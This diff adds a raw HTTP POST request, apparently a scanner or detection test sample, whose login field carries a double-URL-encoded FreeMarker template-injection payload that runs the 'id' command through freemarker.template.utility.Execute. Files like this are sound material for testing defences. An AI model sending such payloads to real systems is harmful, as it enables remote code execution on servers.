@@ -1,0 +1,9 @@
+POST / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Length: 206
+
+login73682a%253D%2524%257B%255C%2522freemarker.template.utility.Execute%255C%2522%253Fnew()(%255C%2522id%255C%2522)%257D%2526passw%253Dhij3kfmedfekmkm%2526token%253Dfdawgk2mnjdnwidfkamjn2i%2526sort%253Dtrue
